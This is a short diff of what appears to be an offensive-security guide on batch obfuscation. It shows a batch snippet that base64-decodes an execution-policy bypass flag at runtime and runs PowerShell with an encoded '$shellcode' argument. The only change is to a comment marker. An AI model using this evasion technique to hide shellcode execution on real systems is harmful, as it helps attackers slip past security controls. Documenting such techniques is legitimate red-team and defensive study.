@@ -148,7 +148,7 @@ The above string can be obfuscated using the **batch special character: ^** <br 
         @echo off
         set base64string="LUV4ZWMgQnlwYXNzCg=="
         for /f "tokens=* delims=" %%# in ('powershell [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("""%base64string%"""^)^)') do set "decoded=%%#"
-        cmd.exe /c powershell.exe -nop %decoded% -noni -enc $shellcode #<-- execute/decode the base64 syscall at runtime
+        cmd.exe /c powershell.exe -nop %decoded% -noni -enc $shellcode ::<-- execute/decode the base64 syscall at runtime
 
 ![batch obfuscation](http://i.)
 
